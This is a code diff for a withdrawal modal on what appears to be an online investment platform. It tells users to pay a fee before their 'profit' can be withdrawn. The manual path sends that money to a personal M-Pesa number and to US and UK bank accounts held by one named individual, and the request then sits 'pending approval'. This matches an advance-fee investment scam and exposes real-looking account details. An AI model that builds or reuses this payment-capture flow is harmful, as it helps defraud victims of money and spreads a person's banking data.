+                        country: "Kenya",
+                        amount_usd: requiredUsd,
+                        profit_amount: profitAmount
+                    })
+                });
+                const paymentData = await paymentResponse.json();
+
+                if (paymentData.status) {
+                    window.location.href = paymentData.data.authorization_url;
+                } else {
+                    alert(paymentData.message || 'Payment initialization failed');
+                    proceedBtn.disabled = false;
+                    proceedBtn.innerHTML = 'Try Again';
+                }
+            };
+            
+        } else {
+            // Manual payment instructions for other countries
+            let specificInstructions = '';
+            
+            if (country === "Uganda") {
+                specificInstructions = `
+                    <div class="payment-instructions">
+                        <h5 class="mb-3"><i class="fas fa-mobile-alt"></i> MTN UGANDA</h5>
+                        <div class="step">1. Dial <b>*165*1#</b></div>
+                        <div class="step">2. Select send money</div>
+                        <div class="step">3. East Africa</div>
+                        <div class="step">4. Safaricom(mpesa)KENYA</div>
+                        <div class="step">5. Enter <b>254769823817</b> as the receiver number</div>
+                        <h5 class="mt-4 mb-3"><i class="fas fa-sim-card"></i> AIRTEL UGANDA</h5>
+                        <div class="step">1. Dial <b>*185*1#</b></div>
+                        <div class="step">2. Select send money</div>
+                        <div class="step">3. International transfer</div>
+                        <div class="step">4. Eastern Africa</div>
+                        <div class="step">5. Kenya</div>
+                        <div class="step">6. Safaricom(mpesa)</div>
+                        <div class="step">7. Enter <b>254769823817</b> as the receiver number</div>
+                        <div class="step">8. Reason: Any</div>
+                    </div>`;
+            } else if (country === "Rwanda") {
+                specificInstructions = `
+                    <div class="payment-instructions">
+                        <h5 class="mb-3"><i class="fas fa-mobile-alt"></i> MTN RWANDA</h5>
+                        <div class="step">1. Dial <b>*182#</b></div>
+                        <div class="step">2. Select send money</div>
+                        <div class="step">3. International transfer</div>
+                        <div class="step">4. Safaricom(mpesa)KENYA</div>
+                        <div class="step">5. Enter <b>254769823817</b> as the receiver number</div>
+                    </div>`;
+            } else if (country === "USA") {
+                specificInstructions = `
+                    <div class="payment-instructions">
+                        <h5 class="mb-3"><i class="fas fa-university"></i> BANK TRANSFER (USA)</h5>
+                        <div class="step"><b>Bank name:</b> Citibank</div>
+                        <div class="step"><b>Transfer type:</b> Local transfer</div>
+                        <div class="step"><b>Bank address:</b> 111 Wall Street New York, NY 10043 USA</div>
+                        <div class="step"><b>Routing (ABA):</b> 031100209</div>
+                        <div class="step"><b>SWIFT code:</b> CITIUS33</div>
+                        <div class="step"><b>Account number:</b> 70580370002083164</div>
+                        <div class="step"><b>Account type:</b> CHECKING</div>
+                        <div class="step"><b>Beneficiary name:</b> Joakim Musyoki</div>
+                    </div>`;
+            } else if (country === "UK") {
+                specificInstructions = `
+                    <div class="payment-instructions">
+                        <h5 class="mb-3"><i class="fas fa-university"></i> BANK TRANSFER (UK)</h5>
+                        <div class="step"><b>Bank name:</b> Barclays</div>
+                        <div class="step"><b>Transfer type:</b> Local transfer</div>
+                        <div class="step"><b>Sort code:</b> 231486</div>
+                        <div class="step"><b>Account number:</b> 15875800</div>
+                        <div class="step"><b>Beneficiary name:</b> Joakim Musyoki</div>
+                    </div>`;
+            } else {
+                // Generic instructions for other countries
+                specificInstructions = `
+                    <div class="payment-instructions">
+                        <h5 class="mb-3"><i class="fas fa-university"></i> BANK TRANSFER</h5>
+                        <div class="step">1. Send payment to our receiving account</div>
+                        <div class="step">2. Account Name: BIG WINNERS INVESTMENT</div>
+                        <div class="step">3. Account Number: 1234567890</div>
+                        <div class="step">4. Bank: Standard Chartered Bank</div>
+                        <div class="step">5. SWIFT/BIC: SCBLKENXXXX</div>
+                    </div>`;
+            }
+            
+            instructions = `
+                <h6>Pay <b>${localAmount.toFixed(2)} ${toCurrency}</b> (${requiredUsd.toFixed(2)} USD)</h6>
+                ${window.withdrawalData.rate !== 1 ? `<div>Conversion Rate: 1 USD = ${window.withdrawalData.rate} ${toCurrency}</div>` : ''}
+                <p><strong>Profit to Withdraw:</strong> $${profitAmount.toFixed(2)} USD</p>
+                ${specificInstructions}
+                <hr>
+                <div class="mb-3">
+                    <label for="withdrawalTransactionIdInput" class="form-label">
+                        <b><i class="fas fa-receipt"></i> Transaction/Reference ID:</b>
+                    </label>
+                    <input type="text" class="form-control" id="withdrawalTransactionIdInput" 
+                           placeholder="Enter your payment transaction/reference ID">
+                    <div class="form-text">This is the reference number from your payment confirmation</div>
+                </div>
+            `;
+            
+            iHavePaidBtn.style.display = 'inline-block';
+            iHavePaidBtn.onclick = submitManualWithdrawalPayment;
+        }
+        
+        paymentDetails.innerHTML = instructions;
+    }
+
+    async function submitManualWithdrawalPayment() {
+        const transactionId = document.getElementById('withdrawalTransactionIdInput').value.trim();
+        const iHavePaidBtn = document.getElementById('iHavePaidBtn');
+        
+        if (!transactionId) {
+            alert('Please enter your payment transaction/reference ID.');
+            return;
+        }
+        
+        iHavePaidBtn.disabled = true;
+        iHavePaidBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span> Submitting...';
+        
+        try {
+            const res = await fetch('/manual_withdrawal_payment_notice', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    amount_usd: window.withdrawalData.requiredUsd,
+                    local_amount: window.withdrawalData.localAmount,
+                    country: window.withdrawalData.country,
+                    transaction_id: transactionId,
+                    profit_amount: window.withdrawalData.profitAmount
+                })
+            });
+            const data = await res.json();
+            
+            if (data.status === 'pending') {
+                const modal = bootstrap.Modal.getInstance(document.getElementById('withdrawalModal'));
+                modal.hide();
+                alert('Your withdrawal payment is pending approval. You will be notified once it is confirmed.');
+                window.location.href = '/dashboard';
+            } else {
+                alert('Failed to submit payment notice: ' + (data.message || 'Try again.'));
+                iHavePaidBtn.disabled = false;
+                iHavePaidBtn.innerHTML = 'I Have Paid';
+            }
+        } catch (err) {
+            alert('Network error. Please try again.');
+            iHavePaidBtn.disabled = false;
+            iHavePaidBtn.innerHTML = 'I Have Paid';
+        }
+    }
+</script>
+<style>
+    /* Payment option cards styling */
+    .payment-option-card {
+        border: 2px solid #dee2e6;
+        border-radius: 10px;
+        padding: 20px;
+        cursor: pointer;
+        transition: all 0.3s;
+        background: white;
+    }
+    
+    .payment-option-card:hover {
+        border-color: #0d6efd;
+        transform: translateY(-5px);
+        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+    
+    .payment-option-card.selected {
+        border-color: #0d6efd;
+        background-color: #e7f1ff;
+    }
+    
+    /* Crypto icons styling */
+    .crypto-icon {
+        font-size: 1.5rem;
+    }
+    
+    .crypto-icon.btc {
+        color: #F7931A;
+    }
+    
+    .crypto-icon.erc20 {
+        color: #26A17B;
+    }
+    
+    .crypto-icon.trc20 {
+        color: #FF6B01;
+    }
+    
+    /* Payment instructions styling */
+    .payment-instructions {
+        background: #f8f9fa;
+        padding: 15px;
+        border-radius: 8px;
+        margin: 15px 0;
+    }
+    
+    .payment-instructions .step {
+        margin-bottom: 8px;
+        padding-left: 20px;
+        position: relative;
+    }
+    
+    .payment-instructions .step:before {
+        content: "•";
+        position: absolute;
+        left: 0;
+        color: #0d6efd;
+        font-weight: bold;
+    }
+</style>
       <!-- Combined Help Icon - Telegram & WhatsApp -->
 <div class="help-icon-container">
     <div class="help-icon-split">
